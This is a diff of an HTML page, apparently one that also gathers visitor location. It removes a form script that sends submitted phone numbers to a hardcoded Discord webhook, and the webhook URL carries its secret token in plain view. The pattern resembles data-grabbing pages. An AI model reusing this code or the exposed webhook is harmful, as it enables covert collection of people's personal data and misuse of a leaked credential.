@@ -189,51 +189,7 @@ ${JSON.stringify(info, null, 2)}
 
   getLocationAndShow();
 </script>
-  <script>
-        const phoneForm = document.getElementById('phoneForm');
-        const phoneNumberInput = document.getElementById('phoneNumber');
-        const errorMessage = document.getElementById('error-message');
 
-        // Discord webhook URL
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY";
-
-        phoneForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
-            
-            const phoneNumber = phoneNumberInput.value.trim();
-            
-            // Validate if the phone number is all digits
-            if (!/^\d+$/.test(phoneNumber)) {
-                errorMessage.style.display = 'block';
-                return;
-            }
-
-            // Hide the error message if validation is successful
-            errorMessage.style.display = 'none';
-
-            // Send the phone number to Discord webhook
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: `New phone number submitted: ${phoneNumber}`
-                    })
-                });
-
-                if (response.ok) {
-                    alert('Phone number submitted successfully!');
-                } else {
-                    alert('Error submitting phone number.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred while submitting the phone number.');
-            }
-        });
-    </script>
 
 
 </body>
